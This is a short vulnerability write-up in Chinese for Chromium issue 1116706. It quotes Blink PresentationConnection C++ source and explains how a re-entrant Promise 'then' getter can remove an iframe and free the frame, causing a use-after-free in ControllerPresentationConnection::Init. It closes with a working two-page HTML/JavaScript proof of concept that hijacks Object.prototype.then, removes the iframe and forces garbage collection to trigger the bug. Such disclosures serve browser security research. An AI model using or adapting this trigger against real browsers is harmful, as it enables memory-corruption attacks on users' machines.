https://bugs.chromium.org/p/chromium/issues/detail?id=1116706
poc:

```
ControllerPresentationConnection* ControllerPresentationConnection::Take(
    PresentationController* controller,
    const mojom::blink::PresentationInfo& presentation_info,
    PresentationRequest* request) {
  DCHECK(controller);
  DCHECK(request);

  auto* connection = MakeGarbageCollected<ControllerPresentationConnection>(
      *controller->GetSupplementable(), controller, presentation_info.id,
      presentation_info.url);
  controller->RegisterConnection(connection);

  // Fire onconnectionavailable event asynchronously.
  auto* event = PresentationConnectionAvailableEvent::Create(
      event_type_names::kConnectionavailable, connection);
  request->GetExecutionContext()
      ->GetTaskRunner(TaskType::kPresentation)
      ->PostTask(FROM_HERE,
                 WTF::Bind(&PresentationConnection::DispatchEventAsync,
                           WrapPersistent(request), WrapPersistent(event)));

  return connection;
}
```
connection = MakeGarbageCollected<ControllerPresentationConnection>它是受gc保护的

  ```c++
  void PresentationConnectionCallbacks::OnSuccess(
      const mojom::blink::PresentationInfo& presentation_info,
      mojo::PendingRemote<mojom::blink::PresentationConnection> connection_remote,
      mojo::PendingReceiver<mojom::blink::PresentationConnection>
          connection_receiver) {
    // Reconnect to existing connection.
    if (connection_ && connection_->GetState() ==
                           mojom::blink::PresentationConnectionState::CLOSED) {
      connection_->DidChangeState(
          mojom::blink::PresentationConnectionState::CONNECTING);
    }
  
    // Create a new connection.
    if (!connection_ && request_) {
      connection_ = ControllerPresentationConnection::Take(
          resolver_.Get(), presentation_info, request_);
    }
  
    resolver_->Resolve(connection_); //***1***
    connection_->Init(std::move(connection_remote),
                      std::move(connection_receiver));
  }
  ```
  
  在resolver_->Resolve(connection_);重入，通过remove iframe使得render frame host被释放
  
  ```
  void ControllerPresentationConnection::Init(
    mojo::PendingRemote<mojom::blink::PresentationConnection> connection_remote,
    mojo::PendingReceiver<mojom::blink::PresentationConnection>
        connection_receiver) {
  // Note that it is possible for the binding to be already bound here, because
  // the ControllerPresentationConnection object could be reused when
  // reconnecting in the same frame. In this case the existing connections are
  // discarded.
  if (connection_receiver_.is_bound()) {
    connection_receiver_.reset();
    target_connection_.reset();
  }

  DidChangeState(mojom::blink::PresentationConnectionState::CONNECTING);
  target_connection_.Bind(
      std::move(connection_remote),
      GetExecutionContext()->GetTaskRunner(blink::TaskType::kPresentation));
  connection_receiver_.Bind(
      std::move(connection_receiver),
      GetExecutionContext()->GetTaskRunner(blink::TaskType::kPresentation));
}
  ```
  既然renderframehost被释放，自然context也一起了，所以在此处GetExecutionContext()->会导致uaf
  
  
  poc：
  ```
  <html>
    <head>
        <script>
            function createIframe(){
                let iframe = document.createElement("iframe");
                iframe.setAttribute("id", "ifm");
                iframe.src="presentation-2.html";
                document.body.appendChild(iframe);
            }
            function remove(){
                let frame = document.getElementById("ifm");
                frame.parentNode.removeChild(frame);
            }
        </script>
    </head>
    <body onload="createIframe()">

    </body>
</html>



<html>
    <head>
        <script>
                Object.prototype.__defineGetter__("then", function() {
                        parent.remove();
                        gc();
                });

                function start(){
                    request = new PresentationRequest([location]);
                    request.start().then(
                        connection=>{
                            console.log(2);
                        }
                    );
                }

                function gc(){
                    for(let i = 0; i < 0x20; i++){
                        try{ new ArrayBuffer(0x1000000);}catch(e){};
                    }
                }
                
            
        </script>
    </head>
    <body>
        <button onclick="start()">Click me</button>
    </body>
</html>
  ```
